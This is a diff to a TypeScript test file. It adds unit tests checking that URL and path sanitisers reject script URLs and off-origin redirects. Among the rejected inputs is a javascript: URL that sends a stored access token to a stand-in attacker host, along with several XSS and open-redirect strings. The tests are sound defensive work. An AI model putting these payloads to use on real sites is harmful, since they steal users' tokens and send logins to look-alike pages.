@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { pickAccentForegroundHsl } from "./utils";
+import { pickAccentForegroundHsl, safeExternalUrl, safeInternalPath } from "./utils";
 import { ROLE_META } from "./roles";
 
 function hslTripleToRgb(triple: string): [number, number, number] {
@@ -56,4 +56,42 @@ describe("pickAccentForegroundHsl", () => {
   it("picks dark navy for a light/bright background", () => {
     expect(pickAccentForegroundHsl("#F08A1D")).toBe("229.7 39.7% 14.3%");
   });
+});
+
+describe("safeExternalUrl", () => {
+  it("keeps http and https links", () => {
+    expect(safeExternalUrl("https://cdn.example.com/rec.mp4")).toBe("https://cdn.example.com/rec.mp4");
+    expect(safeExternalUrl("http://cdn.example.com/rec.mp4")).toBe("http://cdn.example.com/rec.mp4");
+  });
+
+  // A stored recording/checkout link is rendered as a clickable href for other users;
+  // a script URL there would run in our origin and could read the viewer's token.
+  it.each([
+    "javascript:fetch('//evil.example/'+localStorage['trn.accessToken'])",
+    "  javascript:alert(1)",
+    "JaVaScRiPt:alert(1)",
+    "data:text/html,<script>alert(1)</script>",
+    "vbscript:msgbox(1)",
+    "",
+    null,
+    undefined,
+  ])("rejects %j", (value) => {
+    expect(safeExternalUrl(value)).toBeNull();
+  });
+});
+
+describe("safeInternalPath", () => {
+  it("keeps in-app paths", () => {
+    expect(safeInternalPath("/admin")).toBe("/admin");
+    expect(safeInternalPath("/parent/billing?tab=due")).toBe("/parent/billing?tab=due");
+  });
+
+  // homePath/defaultRoute end up in navigate()/<Navigate to> — an off-origin value
+  // would redirect the login onto a look-alike sign-in page.
+  it.each(["//evil.example", "https://evil.example", "/\\evil.example", "\\\\evil.example", "javascript:alert(1)", "admin", "", null, undefined])(
+    "rejects %j",
+    (value) => {
+      expect(safeInternalPath(value)).toBeNull();
+    }
+  );
 });
